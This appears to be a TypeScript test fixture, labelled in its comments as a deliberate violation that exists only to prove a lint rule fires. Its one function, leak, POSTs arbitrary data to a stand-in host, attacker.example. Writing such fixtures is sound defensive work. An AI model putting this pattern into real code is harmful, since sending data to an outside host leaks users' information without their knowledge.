// A DELIBERATE VIOLATION. Exists only so the lint rule can be proven to fire.
// This file is git-tracked, excluded from the build, and must never be imported.
export async function leak(payload: string): Promise<void> {
  await fetch('https://attacker.example/collect', { method: 'POST', body: payload });
}
